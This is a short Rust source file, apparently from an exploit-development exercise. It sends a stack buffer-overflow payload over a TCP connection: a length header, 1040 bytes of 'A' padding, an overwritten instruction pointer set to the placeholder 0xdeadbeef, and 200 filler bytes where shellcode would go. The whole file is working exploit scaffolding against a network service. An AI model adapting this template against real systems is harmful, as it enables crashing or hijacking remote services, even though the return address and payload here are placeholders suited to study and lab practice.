use std::io::Write;
use std::iter::repeat;
use std::net::TcpStream;

pub fn overwrite_eip(stream: &mut TcpStream) -> Result<usize, String> {
    let length: u32 = 2000;
    let bytes_until_eip: String = repeat('A').take(1040).collect();
    let overwritten_instruction_pointer_eip: u32 = 0xdeadbeef;
    let payload: String = repeat('Z').take(200).collect();

    let mut data: Vec<u8> = Vec::new();
    data.extend(length.to_le_bytes());
    data.extend(bytes_until_eip.as_bytes());
    data.extend(overwritten_instruction_pointer_eip.to_le_bytes());
    data.extend(payload.as_bytes());

    match stream.write(data.as_slice()) {
        Ok(stream) => Ok(stream),
        Err(e) => {
            return Err(format!("Failed to write to stream: {}", e));
        }
    }
}
